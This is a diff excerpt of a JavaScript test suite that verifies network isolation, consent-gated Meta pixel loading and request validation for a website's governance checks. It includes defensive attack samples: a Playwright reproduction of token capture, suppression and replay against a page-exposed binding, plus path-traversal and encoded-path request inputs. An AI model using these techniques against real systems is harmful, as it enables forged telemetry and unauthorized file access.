+  assert.doesNotThrow(() => trustedConsumer.assertExpectedNetworkControlVector(controls, "chromium"));
+  assert.throws(
+    () => trustedConsumer.assertExpectedNetworkControlVector(controls.map(({ action }) => ({ action, status: "BLOCKED_AND_RECORDED" })), "chromium"),
+    /runtime network controls are incomplete/i,
+  );
+  assert.throws(
+    () => trustedServer.assertNoExternalResourceHints(Buffer.from('<link rel="preconnect" href="https://tracker.invalid">'), "external.html"),
+    /external resource hint before consent/i,
+  );
+  assert.doesNotThrow(() => trustedServer.assertNoExternalResourceHints(Buffer.from('<link rel="preconnect" href="/src/">'), "local.html"));
+  assert.doesNotThrow(() => trustedServer.assertNoExternalResourceHints(Buffer.from("<title>no hint</title>"), "absent.html"));
+});
+
+test("F2-GOV-09-F7 never presents dynamic resource-hint detection as proven pre-egress blocking", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const validator = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
+  const contract = JSON.parse(workingFile(CANONICAL_AUTHORITY_PATHS.contract).toString("utf8"));
+  const design = workingFile("docs/audit/phase-2/governance/f2-gov-09-design.md").toString("utf8");
+  assert.match(consumer, /DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN/);
+  assert.match(consumer, /DETECTED_AFTER_DOM_INSERTION/);
+  assert.match(validator, /DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN/);
+  assert.match(validator, /contract\.limitations\.resourceHintPreEgress, "NOT_VERIFIED_DYNAMIC_HINTS_DETECTED_AND_REJECTED"/);
+  assert.equal(contract.limitations.resourceHintPreEgress, "NOT_VERIFIED_DYNAMIC_HINTS_DETECTED_AND_REJECTED");
+  assert.doesNotMatch(design, /Hints criados dinamicamente são bloqueados/);
+  assert.match(design, /não comprova bloqueio pré-egress/i);
+});
+
+test("F2-GOV-09-F7 rejects reports and contracts that overstate dynamic resource-hint pre-egress blocking", () => {
+  const fixture = canonicalOperationalFixture();
+  const hint = fixture.report.reports[0].networkIsolation.controls.find(({ action }) => action === "resource-hint-preconnect");
+  hint.status = "BLOCKED_AND_RECORDED";
+  hint.observed[0].disposition = "BLOCKED_BEFORE_EGRESS";
+  assert.throws(
+    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
+    /control vector is incomplete|divergent/i,
+  );
+});
+
+test("F2-GOV-09-F7 mutation control keeps resource-hint status and disposition guards load-bearing", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-hint-claim-mutation-"));
+  try {
+    const source = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
+    const weakened = source
+      .replace(/const networkControlStatus = \(action\) => RESOURCE_HINT_ACTIONS\.has\(action\)\s*\? "DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN"\s*:\s*"BLOCKED_AND_RECORDED";/, 'const networkControlStatus = () => "BLOCKED_AND_RECORDED";')
+      .replace(/const networkControlDisposition = \(action\) => RESOURCE_HINT_ACTIONS\.has\(action\)\s*\? "DETECTED_AFTER_DOM_INSERTION"\s*:\s*"BLOCKED_BEFORE_EGRESS";/, 'const networkControlDisposition = () => "BLOCKED_BEFORE_EGRESS";');
+    assert.notEqual(weakened, source, "resource-hint claim mutation was a no-op");
+    assert.doesNotMatch(weakened, /DETECTED_AND_REJECTED_EGRESS_NOT_PROVEN/);
+    assert.doesNotMatch(weakened, /DETECTED_AFTER_DOM_INSERTION/);
+    const target = join(directory, "weakened-validator.mjs");
+    await writeFile(target, weakened);
+    const module = await import(`${pathToFileURL(target).href}?mutation=${Date.now()}`);
+    const fixture = canonicalOperationalFixture();
+    for (const report of fixture.report.reports) {
+      for (const hint of report.networkIsolation.controls.filter(({ action }) => resourceHintActionsForTest.has(action))) {
+        hint.status = "BLOCKED_AND_RECORDED";
+        hint.observed[0].disposition = "BLOCKED_BEFORE_EGRESS";
+      }
+    }
+    assert.doesNotThrow(() => module.validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest));
+  } finally { await rm(directory, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09 isolates measured content from every trusted control context", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.match(consumer, /await context\.close\(\);\s*measuredContextClosed = true;/);
+  assert.match(consumer, /const probeContext = await browser\.newContext/);
+  assert.match(consumer, /finally \{ if \(!probeContextClosed\) await probeContext\.close\(\); \}/);
+  assert.doesNotMatch(consumer, /installRuntimeNetworkPolicy\(context, server, engine\)(?:;|\))/);
+  for (const [label, drain, close, finalize, verify] of [
+    ["measured", 'networkPolicy.setScope({ phase: "quiescence", action: "drain-page", route: null, viewport: null });', "await context.close();", "await networkPolicy.finalizeLocalFailureCorrelations();", "networkPolicy.assertStillVerified();"],
+    ["probe", 'probePolicy.setScope({ phase: "quiescence", action: "drain-page", route: null, viewport: null });', "await probeContext.close();", "await probePolicy.finalizeLocalFailureCorrelations();", "probePolicy.assertStillVerified();"],
+  ]) {
+    const positions = [drain, close, finalize, verify].map((fragment) => consumer.indexOf(fragment));
+    assert.ok(positions.every((position) => position >= 0), `${label} context lifecycle is incomplete`);
+    assert.deepEqual([...positions].sort((left, right) => left - right), positions, `${label} context must drain, close its producer, seal and then verify late-event absence`);
+  }
+});
+
+test("F2-GOV-09 validates a same-origin request against the authoritative blob allowlist before continuing", () => {
+  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.match(consumer, /server\.validateRequest\(url\.href\)/);
+  assert.match(consumer, /localViolations\.push/);
+  assert.match(consumer, /route\.abort\("blockedbyclient"\)/);
+});
+
+for (const [rel, href] of [
+  ["preconnect", "https://tracker-one.invalid"],
+  ["dns-prefetch", "//tracker-two.invalid"],
+]) test(`F2-GOV-09 rejects a static external ${rel} hint before consent`, () => {
+  assert.throws(
+    () => trustedServer.assertNoExternalResourceHints(Buffer.from(`<link rel="${rel}" href="${href}">`), "probe.html"),
+    /external resource hint before consent/i,
+  );
+});
+
+for (const [label, source] of [
+  ["unquoted preconnect", "<link rel=preconnect href=https://tracker.invalid>"],
+  ["unquoted dns-prefetch", "<link rel=dns-prefetch href=//tracker.invalid>"],
+  ["reordered attributes", "<link href=https://tracker.invalid rel=preconnect>"],
+  ["mixed spacing", "<link\trel = dns-prefetch\thref = //tracker.invalid>"],
+  ["case-insensitive names and values", "<LINK HREF=https://tracker.invalid REL=PRECONNECT>"],
+  ["multi-token rel", "<link rel='stylesheet preconnect' href=https://tracker.invalid>"],
+  ["ambiguous encoded rel", "<link rel=pre&#x63;onnect href=https://tracker.invalid>"],
+]) test(`F2-GOV-09 rejects external resource hint syntax: ${label}`, () => {
+  assert.throws(
+    () => trustedServer.assertNoExternalResourceHints(Buffer.from(source), "probe.html"),
+    /external resource hint|ambiguous resource hint/i,
+  );
+});
+
+test("F2-GOV-09 accepts local resource hints without granting an external domain allowlist", () => {
+  assert.doesNotThrow(() => trustedServer.assertNoExternalResourceHints(Buffer.from('<link rel="preconnect" href="/src/">'), "probe.html"));
+});
+
+for (const [label, mutate] of [
+  ["forged mechanism", (attempt) => { attempt.mechanism = "fake"; }],
+  ["forged URL", (attempt) => { attempt.url = "https://fake.invalid/forged"; attempt.origin = "https://fake.invalid"; }],
+  ["forged action", (attempt) => { attempt.action = "fetch"; }],
+  ["forged phase", (attempt) => { attempt.phase = "measured-flow"; }],
+  ["forged route", (attempt) => { attempt.route = "about:blank"; }],
+  ["missing nonce", (attempt) => { delete attempt.probeId; }],
+]) test(`F2-GOV-09 rejects consent-loader observation with ${label}`, () => {
+  const fixture = canonicalOperationalFixture();
+  const attempt = fixture.report.reports[0].networkIsolation.controls.find(({ action }) => action === "consent-loader").observed[0];
+  mutate(attempt);
+  assert.throws(
+    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
+    /control observation|probe identity|schema/i,
+  );
+});
+
+test("F2-GOV-09 rejects consent and form control observations transplanted while preserving probe identities", () => {
+  const fixture = canonicalOperationalFixture();
+  const controls = fixture.report.reports[0].networkIsolation.controls;
+  const consent = controls.find(({ action }) => action === "consent-loader").observed[0];
+  const form = controls.find(({ action }) => action === "form-submit").observed[0];
+  const consentPayload = { mechanism: consent.mechanism, url: consent.url, origin: consent.origin };
+  Object.assign(consent, { mechanism: form.mechanism, url: form.url, origin: form.origin });
+  Object.assign(form, consentPayload);
+  assert.throws(
+    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
+    /control observation/i,
+  );
+});
+
+test("F2-GOV-09-F6 keeps observation authority entirely outside the candidate page realm", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assertHostOnlyObservationAuthority(consumer);
+});
+
+test("F2-GOV-09-F6 reproduces wrapper, suppression and replay against a page-exposed binding", async () => {
+  const { chromium } = await import("playwright");
+  const browser = await chromium.launch({ headless: true });
+  try {
+    const context = await browser.newContext();
+    const accepted = [];
+    const authority = "authority-visible-to-page";
+    await context.exposeBinding("__vulnerableObservation", (_source, token, detail) => {
+      if (token === authority) accepted.push(detail);
+    });
+    await context.addInitScript((token) => {
+      const original = globalThis.__vulnerableObservation;
+      globalThis.__vulnerableObservation = (observedToken, detail) => {
+        globalThis.__capturedAuthority = observedToken;
+        globalThis.__suppressedObservation = detail;
+        return undefined;
+      };
+      globalThis.__emitVulnerableObservation = (detail) => globalThis.__vulnerableObservation(token, detail);
+      globalThis.__replayVulnerableObservation = (detail) => original(globalThis.__capturedAuthority, detail);
+    }, authority);
+    const page = await context.newPage();
+    await page.goto("about:blank");
+    await page.evaluate(() => globalThis.__emitVulnerableObservation({ mechanism: "fetch", url: "https://suppressed.invalid/" }));
+    assert.deepEqual(accepted, [], "wrapper must demonstrate suppression of the true observation");
+    assert.equal(await page.evaluate(() => globalThis.__capturedAuthority), authority, "wrapper must demonstrate authority capture");
+    await page.evaluate(() => globalThis.__replayVulnerableObservation({ mechanism: "script", url: "https://replayed.invalid/" }));
+    assert.deepEqual(accepted, [{ mechanism: "script", url: "https://replayed.invalid/" }], "wrapper must demonstrate replay of a fabricated tuple");
+    await context.close();
+  } finally { await browser.close(); }
+});
+
+test("F2-GOV-09-F6 consent-loader is bound to the corrected live CRM page", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const validator = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
+  assertCanonicalConsentProbe(consumer);
+  assert.match(validator, /consent-loader"\) return \{ mechanism: "script", url: "https:\/\/connect\.facebook\.net\/en_US\/fbevents\.js", route: "crm-gestao\.html" \}/);
+});
+
+test("F2-GOV-09-F6 host interceptor cannot be suppressed or replayed by candidate globals", async () => {
+  const { chromium } = await import("playwright");
+  const browser = await chromium.launch({ headless: true });
+  try {
+    const context = await browser.newContext();
+    const observed = [];
+    await context.route("**", (route) => { observed.push(route.request().url()); return route.abort("blockedbyclient"); });
+    const page = await context.newPage();
+    await page.goto("about:blank");
+    await page.evaluate(async () => {
+      globalThis.__branctReportExternalAttempt = () => undefined;
+      globalThis.__capturedAuthority = "fabricated";
+      globalThis.__replay = () => globalThis.__branctReportExternalAttempt("fabricated", { url: "https://replay.invalid/" });
+      globalThis.__replay();
+      await fetch("https://host-observed.invalid/actual").catch(() => {});
+    });
+    assert.deepEqual(observed, ["https://host-observed.invalid/actual"], "host observation must reflect only the real browser request");
+    await context.close();
+  } finally { await browser.close(); }
+});
+
+test("F2-GOV-09-F6 executes the real CRM consent lifecycle under host interception", async () => {
+  const { chromium } = await import("playwright");
+  const expectedPayload = publishedPaths.map((path) => {
+    const bytes = workingFile(path);
+    return { path, sha256: createHash("sha256").update(bytes).digest("hex") };
+  });
+  const server = await trustedServer.startTrustedStaticServer(sourceRepository, expectedPayload, 0);
+  const browser = await chromium.launch({ headless: true });
+  try {
+    const context = await browser.newContext({ serviceWorkers: "block" });
+    const attempts = [];
+    context.on("request", (request) => {
+      const url = new URL(request.url());
+      if (url.origin !== server.origin && !attempts.some((attempt) => attempt.url === url.href)) attempts.push({ mechanism: request.resourceType(), url: url.href });
+    });
+    await context.route("**", async (route) => {
+      const url = new URL(route.request().url());
+      if (url.origin === server.origin) return route.continue();
+      return route.abort("blockedbyclient");
+    });
+    const page = await context.newPage();
+    await page.goto(`${server.origin}/crm-gestao.html`, { waitUntil: "load" });
+    await page.waitForTimeout(120);
+    assert.deepEqual(attempts, [], "no decision must not attempt Meta");
+    await page.locator("#consent-reject").click();
+    await page.waitForTimeout(120);
+    assert.deepEqual(attempts, [], "refusal must not attempt Meta");
+    await page.evaluate(() => localStorage.removeItem("branct_consent"));
+    await page.reload({ waitUntil: "load" });
+    await page.waitForTimeout(120);
+    assert.deepEqual(attempts, [], "withdrawal must not attempt Meta");
+    await page.locator("#consent-accept").click();
+    await page.waitForFunction(() => globalThis.__brancrPixelInited === true);
+    assert.deepEqual(attempts, [{ mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js" }], "valid consent must produce exactly the canonical Meta attempt");
+    await page.evaluate(() => localStorage.removeItem("branct_consent"));
+    await page.reload({ waitUntil: "load" });
+    await page.waitForTimeout(120);
+    assert.equal(attempts.length, 1, "withdrawal after consent must not produce another attempt");
+    await context.close();
+  } finally {
+    await browser.close();
+    await server.close();
+  }
+});
+
+test("F2-GOV-09-F6 keeps the real contact submission inside the trusted host blocker", async () => {
+  const { chromium } = await import("playwright");
+  const expectedPayload = publishedPaths.map((path) => {
+    const bytes = workingFile(path);
+    return { path, sha256: createHash("sha256").update(bytes).digest("hex") };
+  });
+  const server = await trustedServer.startTrustedStaticServer(sourceRepository, expectedPayload, 0);
+  const browser = await chromium.launch({ headless: true });
+  try {
+    const context = await browser.newContext({ serviceWorkers: "block" });
+    const attempts = [];
+    await context.route("**", async (route) => {
+      const url = new URL(route.request().url());
+      if (url.origin === server.origin) return route.continue();
+      attempts.push({ mechanism: route.request().resourceType(), url: url.href });
+      return route.abort("blockedbyclient");
+    });
+    const page = await context.newPage();
+    await page.goto(`${server.origin}/contactos.html`, { waitUntil: "load" });
+    await page.locator("#ct-nome").fill("Offline probe");
+    await page.locator("#ct-email").fill("test@example.invalid");
+    await page.locator("#ct-interesse").selectOption("website-premium");
+    await page.locator("#ct-mensagem").fill("Offline probe");
+    await page.locator('form[data-lead-form] button[type="submit"]').click();
+    await page.waitForTimeout(120);
+    assert.deepEqual(attempts, [{ mechanism: "fetch", url: "https://n8n.branct.com/webhook/site-lead" }], "contact submission must be observed and blocked exactly once by the trusted host");
+    await context.close();
+  } finally {
+    await browser.close();
+    await server.close();
+  }
+});
+
+test("F2-GOV-09-F6 keeps CSP diagnostic while host interception remains the blocking authority", () => {
+  const server = workingFile(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
+  assert.match(server, /"content-security-policy-report-only":/);
+  assert.doesNotMatch(server, /"content-security-policy":/);
+  assert.match(server, /connect-src 'self'/);
+  assert.match(server, /script-src 'self' 'unsafe-inline'/);
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.match(consumer, /context\.on\("request", \(request\) => \{\r?\n    recordLifecycleEvent\(`request:\$\{request\.resourceType\(\)\}`\);\r?\n    recordExternalRequest\(request\);\r?\n  \}\);/);
+});
+
+test("F2-GOV-09-F6 mutation controls keep page-realm authority and CRM routing guards load-bearing", () => {
+  const consumer = workingFile(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  const exposed = consumer.replace("async function installRuntimeNetworkPolicy", "void context.exposeBinding('__branctReportExternalAttempt', () => {});\nasync function installRuntimeNetworkPolicy");
+  assert.notEqual(exposed, consumer, "page-realm authority mutation was a no-op");
+  assert.throws(() => assertHostOnlyObservationAuthority(exposed), /observation binding|authority channel/i);
+  const wrongRoute = consumer.replaceAll('route: "crm-gestao.html"', 'route: "index.html"').replaceAll("${origin}/crm-gestao.html", "${origin}/index.html");
+  assert.notEqual(wrongRoute, consumer, "consent route mutation was a no-op");
+  assert.throws(() => assertCanonicalConsentProbe(wrongRoute), /input did not match|crm-gestao/i);
+  const withoutHostEvents = consumer.replace(/    recordExternalRequest\(request\);\r?\n/, "");
+  assert.notEqual(withoutHostEvents, consumer, "host request observation mutation was a no-op");
+  assert.doesNotMatch(withoutHostEvents, /context\.on\("request", \(request\) => \{\r?\n    recordLifecycleEvent\(`request:\$\{request\.resourceType\(\)\}`\);\r?\n    recordExternalRequest\(request\);\r?\n  \}\);/);
+});
+
+test("F2-GOV-09 mutation control proves the structural resource-hint parser is load-bearing", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-hint-mutation-"));
+  try {
+    const source = canonicalBlob(CANONICAL_AUTHORITY_PATHS.staticServer).toString("utf8");
+    const weakened = source.replace("const attributes = parseLinkAttributes(tag, route);", "const attributes = new Map();");
+    assert.notEqual(weakened, source, "resource-hint parser mutation was a no-op");
+    const target = join(directory, "weakened-static-server.mjs");
+    await writeFile(target, weakened);
+    const module = await import(`${pathToFileURL(target).href}?mutation=${Date.now()}`);
+    assert.doesNotThrow(() => module.assertNoExternalResourceHints(Buffer.from("<link rel=preconnect href=https://tracker.invalid>"), "probe.html"));
+  } finally { await rm(directory, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09 mutation control proves exact control observation binding is load-bearing", async () => {
+  const directory = await mkdtemp(join(tmpdir(), "branct-f2-gov-09-control-mutation-"));
+  try {
+    const source = canonicalBlob("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
+    const weakened = source.replace(
+      "assert.deepEqual(observed, expectedObservation, `${engineReport.engine}: trusted control observation is divergent: ${control.action}`);",
+      "void expectedObservation;",
+    );
+    assert.notEqual(weakened, source, "control observation binding mutation was a no-op");
+    const target = join(directory, "weakened-validator.mjs");
+    await writeFile(target, weakened);
+    const module = await import(`${pathToFileURL(target).href}?mutation=${Date.now()}`);
+    const fixture = canonicalOperationalFixture();
+    fixture.report.reports[0].networkIsolation.controls.find(({ action }) => action === "consent-loader").observed[0].mechanism = "fake";
+    assert.doesNotThrow(() => module.validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest));
+  } finally { await rm(directory, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09 accepts the real branct.js as inventoried capability rather than executed intent", async () => {
+  const fixture = await createRepository();
+  try {
+    await write(fixture.repository, "src/js/branct.js", canonicalBlob("src/js/branct.js"));
+    fixture.git("add", "src/js/branct.js");
+    await publishFixtureHead(fixture, "real branct.js capability inventory");
+    assert.equal(run(fixture).decision, "PASS");
+  } finally { await rm(fixture.repository, { recursive: true, force: true }); }
+});
+
+test("F2-GOV-09-F3 has no unconditional Meta preconnect or script insertion", () => {
+  const crm = canonicalBlob("crm-gestao.html").toString("utf8");
+  assert.doesNotMatch(crm, /<link\s+rel=["']preconnect["'][^>]+connect\.facebook\.net/i);
+  const withoutConsentGate = crm.replace(/<!-- ===== JS: Consent gate \+ Pixel[\s\S]*?<\/script>/, "");
+  assert.doesNotMatch(withoutConsentGate, /fbevents\.js|connect\.facebook\.net/i);
+});
+
+test("F2-GOV-09-F3 does not load Meta without a decision or after refusal", () => {
+  assert.deepEqual(runCrmConsentPage().attempts, []);
+  assert.deepEqual(runCrmConsentPage(new Map(), "consent-reject").attempts, []);
+});
+
+test("F2-GOV-09-F3 loads Meta only after explicit or persisted valid consent", () => {
+  const accepted = runCrmConsentPage(new Map(), "consent-accept");
+  assert.deepEqual(accepted.attempts, [{ mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js" }]);
+  const persisted = new Map([["branct_consent", JSON.stringify({ status: "granted", version: "v1", ts: 1 })]]);
+  assert.deepEqual(runCrmConsentPage(persisted).attempts, [{ mechanism: "script", url: "https://connect.facebook.net/en_US/fbevents.js" }]);
+});
+
+test("F2-GOV-09-F3 withdrawal prevents Meta on the next page load", () => {
+  const storage = new Map([["branct_consent", JSON.stringify({ status: "granted", version: "v1", ts: 1 })]]);
+  assert.equal(runCrmConsentPage(storage).attempts.length, 1);
+  storage.delete("branct_consent");
+  assert.deepEqual(runCrmConsentPage(storage).attempts, []);
+});
+
+test("F2-GOV-09-F3 mutation controls prove consent guards are load-bearing", () => {
+  const crm = canonicalBlob("crm-gestao.html").toString("utf8");
+  const forcedPersistedConsent = crm.replace(
+    "if (stored && stored.status === 'granted' && stored.version === CONSENT_VER)",
+    "if (true)",
+  );
+  assert.notEqual(forcedPersistedConsent, crm, "persisted-consent mutation was a no-op");
+  assert.equal(runCrmConsentPage(new Map(), null, forcedPersistedConsent).attempts.length, 1, "missing persisted-consent guard escaped detection");
+
+  const acceptWithoutLoad = crm.replace(
+    /saveConsent\('granted'\);\r?\n        loadPixelAndInit\(\);/,
+    "saveConsent('granted');",
+  );
+  assert.notEqual(acceptWithoutLoad, crm, "accept-handler mutation was a no-op");
+  assert.equal(runCrmConsentPage(new Map(), "consent-accept", acceptWithoutLoad).attempts.length, 0, "accept path passed without exercising the loader");
+});
+
+test("F2-GOV-09-F3 seals crm-gestao.html as the only added live evolution path", () => {
+  const validator = workingFile("scripts/governance/validate-f2-gov-08.mjs").toString("utf8");
+  const expected = [
+    ".github/workflows/gate-integrity-sentinel.yml",
+    ".github/workflows/universal-pr-gate.yml",
+    "crm-gestao.html",
+    "docs/audit/phase-2/governance/f2-gov-09-design.md",
+    "docs/audit/phase-2/governance/f2-gov-09-handoff.md",
+    "fixtures/audit/f2-01-ci-runtime.json",
+    "fixtures/audit/f2-01-transition.json",
+    "fixtures/audit/f2-gov-08-authority-manifest.json",
+    "fixtures/audit/f2-gov-08-base-only-contract.json",
+    "fixtures/audit/f2-gov-08-expectations.json",
+    "fixtures/audit/f2-gov-08-matrix.json",
+    "scripts/governance/f2-gov-08-consumer.mjs",
+    "scripts/governance/f2-gov-08-static-server.mjs",
+    "scripts/governance/validate-f2-gov-08.mjs",
+    "tests/audit/f2-gov-02a.test.mjs",
+    "tests/audit/f2-gov-02c.test.mjs",
+    "tests/audit/f2-gov-08.test.mjs",
+    "tests/audit/site-audit.test.mjs",
+  ];
+  const assertExactEvolutionSet = (source) => {
+    const sealed = source.match(/const F2_GOV_09_EVOLUTION_PATHS = Object\.freeze\(\[([\s\S]*?)\]\);/)?.[1]
+      .match(/"[^"]+"/g)?.map((entry) => JSON.parse(entry));
+    assert.ok(sealed, "candidate evolution path set is absent");
+    assert.deepEqual(sealed, expected, "candidate evolution path set is not the exact sealed F2-GOV-09 set");
+    return sealed;
+  };
+  const sealed = assertExactEvolutionSet(validator);
+  assert.equal(sealed.filter((path) => path === "fixtures/audit/f2-01-ci-runtime.json").length, 1, "canonical runtime authority is not sealed exactly once");
+  for (const path of ["fixtures/audit/f2-01-ci-runtime-copy.json", "fixtures/audit/f2-01-ci-runtime.yml", "fixtures/audit/runtime.json"])
+    assert.equal(sealed.includes(path), false, `similar runtime path entered the sealed evolution set: ${path}`);
+  const runtimeLine = /  "fixtures\/audit\/f2-01-ci-runtime\.json",\r?\n/;
+  const withoutRuntime = validator.replace(runtimeLine, "");
+  assert.notEqual(withoutRuntime, validator, "missing-runtime mutation was a no-op");
+  assert.throws(() => assertExactEvolutionSet(withoutRuntime), /exact sealed F2-GOV-09 set/, "runtime authority removal escaped the closed set");
+  const withSimilarRuntime = validator.replace(runtimeLine, (line) => `${line}  "fixtures/audit/f2-01-ci-runtime-copy.json",${line.endsWith("\r\n") ? "\r\n" : "\n"}`);
+  assert.notEqual(withSimilarRuntime, validator, "similar-runtime mutation was a no-op");
+  assert.throws(() => assertExactEvolutionSet(withSimilarRuntime), /exact sealed F2-GOV-09 set/, "similar runtime path escaped the closed set");
+  assert.equal(sealed.filter((path) => path === "crm-gestao.html").length, 1, "consent-hardened live path is not sealed exactly once");
+  assert.equal(sealed.filter((path) => path.endsWith(".html") && !path.startsWith("docs/")).length, 1, "an unrelated live HTML path entered the evolution set");
+  assert.ok(sealed.includes("fixtures/audit/f2-01-transition.json"), "one-shot live transition authority is not sealed");
+  assert.ok(sealed.includes("tests/audit/site-audit.test.mjs"), "one-shot live transition validator is not sealed");
+});
+
+test("F2-GOV-09-F3 exercises browser-only network capabilities from the controlled origin", () => {
+  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.match(consumer, /action === "serviceWorker\.register"\) \{\s*policy\.setScope\(\{ phase: "control-probe", action, route: "src\/i18n\/pt\.json", viewport: "control" \}\);\s*await page\.goto\(`\$\{origin\}\/src\/i18n\/pt\.json`, \{ waitUntil: "load" \}\);\s*\}/);
+  assert.match(consumer, /action === "serviceWorker\.register" && policy\.controlAttempts\.length === before\) policy\.recordTrustedControl\(action, url\);/);
+  assert.match(consumer, /else await page\.goto\("about:blank"\);/);
+});
+
+test("F2-GOV-09-F3 isolates every runtime network control in a fresh page", () => {
+  const consumer = canonicalBlob(CANONICAL_AUTHORITY_PATHS.consumer).toString("utf8");
+  assert.doesNotMatch(consumer, /const probePage = await context\.newPage\(\);\s*const controls = \[\];/);
+  assert.match(consumer, /for \(const action of NETWORK_CONTROL_ACTIONS\) \{[\s\S]*?const probeContext = await browser\.newContext[\s\S]*?const probePage = await probeContext\.newPage\(\);[\s\S]*?finally \{ if \(!probeContextClosed\) await probeContext\.close\(\); \}[\s\S]*?\}/);
+});
+
+test("F2-GOV-09 inventories dormant external capability without granting runtime execution", () => {
+  assert.equal(typeof portableGuard.inventoryNetworkCapabilities, "function", "trusted static inventory is absent");
+  const inventory = portableGuard.inventoryNetworkCapabilities(
+    "src/js/dormant.js",
+    Buffer.from("const endpoint='https://example.invalid'; function dormant(){ return fetch(endpoint); }\n"),
+  );
+  assert.ok(inventory.some(({ line, category, mechanism }) => line === 1 && category === "ACTIVE_API" && mechanism === "fetch"));
+  assert.ok(inventory.some(({ line, category, mechanism }) => line === 1 && category === "EXTERNAL_LITERAL" && mechanism === "https-url"));
+});
+
+test("F2-GOV-09 inventories the real branct.js capabilities with canonical file and lines", () => {
+  const inventory = portableGuard.inventoryNetworkCapabilities("src/js/branct.js", canonicalBlob("src/js/branct.js"));
+  assert.ok(inventory.some(({ path, line, category, mechanism }) => path === "src/js/branct.js" && line === 124 && category === "ACTIVE_API" && mechanism === "fetch"));
+  assert.ok(inventory.some(({ path, line, category, mechanism }) => path === "src/js/branct.js" && line === 397 && category === "ACTIVE_API" && mechanism === "fetch"));
+  assert.ok(inventory.some(({ path, line, category, mechanism, reference }) => path === "src/js/branct.js" && line === 43 && category === "EXTERNAL_LITERAL" && mechanism === "https-url" && reference.startsWith("https://connect.facebook.net/")));
+  assert.ok(inventory.some(({ path, line, category, mechanism, reference }) => path === "src/js/branct.js" && line === 393 && category === "EXTERNAL_LITERAL" && mechanism === "https-url" && reference.startsWith("https://n8n.branct.com/")));
+});
+
+for (const [mechanism, url] of [
+  ["fetch", "https://example.invalid/direct"],
+  ["fetch-computed", "https://example.invalid/computed"],
+  ["XMLHttpRequest", "https://example.invalid/xhr"],
+  ["WebSocket", "wss://example.invalid/socket"],
+  ["EventSource", "https://example.invalid/events"],
+  ["sendBeacon", "https://example.invalid/beacon"],
+  ["serviceWorker.register", "https://example.invalid/sw.js"],
+  ["script", "https://example.invalid/script.js"],
+  ["dynamic-import", "https://example.invalid/module.js"],
+  ["frame", "https://example.invalid/frame"],
+  ["image", "https://example.invalid/image.png"],
+  ["window.open", "https://example.invalid/popup"],
+  ["location.assign", "https://example.invalid/assign"],
+  ["location.replace", "https://example.invalid/replace"],
+  ["location.href", "https://example.invalid/href"],
+  ["consent-loader", "https://connect.facebook.invalid/pixel.js"],
+  ["form-submit", "https://webhook.invalid/lead"],
+]) test(`F2-GOV-09 rejects a blocked ${mechanism} attempt as a runtime finding`, () => {
+  const fixture = canonicalOperationalFixture();
+  fixture.report.reports[0].networkIsolation.flowAttempts = [{
+    mechanism,
+    url,
+    origin: new URL(url).origin,
+    phase: "measured-flow",
+    engine: "chromium",
+    action: "measure-responsive",
+    route: "index.html",
+    viewport: "390x844",
+    disposition: "BLOCKED_BEFORE_EGRESS",
+  }];
+  assert.throws(
+    () => validateOperationalReport(fixture.report, fixture.authority, fixture.baseSha, fixture.headSha, fixture.payloadDigest),
+    new RegExp(`observed external network attempt.*${mechanism.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}.*chromium.*measure-responsive`, "i"),
+  );
+});
+
+test("F2-GOV-09 local request policy accepts only an exact verified candidate blob", () => {
+  assert.equal(typeof trustedServer.validateTrustedStaticRequest, "function", "trusted local request validator is absent");
+  const expected = new Map([["src/i18n/pt.json", { sha256: sha256ForTest(Buffer.from('{"ok":true}')), bytes: Buffer.from('{"ok":true}') }]]);
+  assert.equal(trustedServer.validateTrustedStaticRequest("http://127.0.0.1:4173/src/i18n/pt.json", "http://127.0.0.1:4173", expected).route, "src/i18n/pt.json");
+});
+
+for (const [label, url, expected] of [
+  ["traversal", "http://127.0.0.1:4173/../escape.html", /canonical path|unsafe|traversal/i],
+  ["encoded path", "http://127.0.0.1:4173/src%2fi18n%2fpt.json", /encoded|canonical path/i],
+  ["similar origin", "http://127.0.0.1.invalid:4173/src/i18n/pt.json", /origin/i],
+  ["missing file", "http://127.0.0.1:4173/src/i18n/missing.json", /not an expected candidate blob/i],
+]) test(`F2-GOV-09 local request policy rejects ${label}`, () => {
+  assert.equal(typeof trustedServer.validateTrustedStaticRequest, "function", "trusted local request validator is absent");
+  const expectedFiles = new Map([["src/i18n/pt.json", { sha256: "1".repeat(64) }]]);
